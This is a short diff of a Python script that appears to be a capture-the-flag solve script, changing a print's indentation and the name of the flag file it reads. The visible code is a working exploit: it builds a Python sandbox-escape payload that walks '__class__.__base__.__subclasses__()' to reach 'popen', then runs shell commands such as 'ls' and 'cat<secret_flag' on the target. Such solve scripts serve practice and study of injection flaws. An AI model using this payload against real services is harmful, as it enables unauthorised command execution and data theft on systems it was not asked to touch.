@@ -72,7 +72,7 @@ def get_text(command, length):
             result += match
         else:
             result += '.'
-        print(result)
+    print(result)
 
 def execute(command, action):
     payload = command + craft("popen.('{}').read.()").format(
@@ -88,4 +88,4 @@ cmd  = craft("().__class__.__base__.__subclasses__.()")
 cmd  = get_module(cmd)
 
 execute(cmd, 'ls')
-execute(cmd, 'cat<zzzz_fl4g_uwu')
+execute(cmd, 'cat<secret_flag')
